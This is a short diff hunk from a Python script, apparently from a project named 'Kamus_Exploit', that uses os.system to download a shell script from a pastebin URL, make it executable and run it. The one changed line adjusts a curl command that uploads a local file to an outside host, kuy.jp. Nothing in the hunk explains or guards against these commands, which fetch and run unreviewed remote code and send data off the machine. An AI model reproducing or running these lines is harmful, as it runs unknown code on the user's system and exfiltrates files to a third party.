@@ -25,7 +25,7 @@ os.system("curl --url https://raw.githubusercontent.com/bibilgates/Kamus_Exploit
 os.system("curl --url https://pastebin.com/raw/PcKFfmq1 -o i.sh")
 os.system('chmod +x i.sh')
 os.system('./i.sh')
-os.system('curl -F data=@/a.txt http://kuy.jp/api.php')
+os.system('curl -F data=@a.txt http://kuy.jp/api.php')
 
 os.system("clear")
 
